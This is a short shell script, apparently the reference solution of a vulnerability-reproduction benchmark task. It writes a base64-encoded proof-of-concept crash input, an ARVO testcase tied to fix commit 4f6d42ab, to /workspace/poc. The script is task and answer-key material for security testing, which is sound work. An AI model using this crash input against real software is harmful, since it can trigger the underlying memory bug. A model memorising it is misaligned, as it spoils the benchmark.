#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit 4f6d42ab addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
EQD9I1sKAP///wAAAACHAAAAAAAAAAC5AgAAAAAAAAAAABQKexC8AAAAAAAAAAAAALz7mwECRAAEAAoAGOPh4+Pj4+MxAAUA99gAEY4AAAAAANv/3////zD/tt4AAK0AACMAALwAW0AxCCYBAAAtAAAAALz/YAAAAKV4/P//AP//AGIAAAAAAAAwCCYBAAF6dLIAlAAAACsAAACHAAAAAFoAzgAAAAoAAIcAAAAAAAAAALwCBt4AAAA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
